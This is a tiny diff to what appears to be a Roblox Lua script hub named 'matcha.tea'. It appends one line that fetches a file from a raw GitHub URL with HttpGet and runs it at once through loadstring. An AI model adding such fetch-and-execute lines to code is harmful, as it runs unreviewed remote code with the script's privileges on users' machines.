@@ -3033,3 +3033,4 @@ pcall(function()
 end)
 
 Library:Notification("matcha.tea", "Thank you for using matcha.tea", 5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kazamatcha/matcha.tea/refs/heads/main/admin"))()
